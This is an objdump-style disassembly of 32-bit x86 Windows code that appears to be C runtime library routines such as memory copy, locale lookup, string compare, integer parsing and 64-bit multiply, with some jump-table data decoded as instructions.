  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
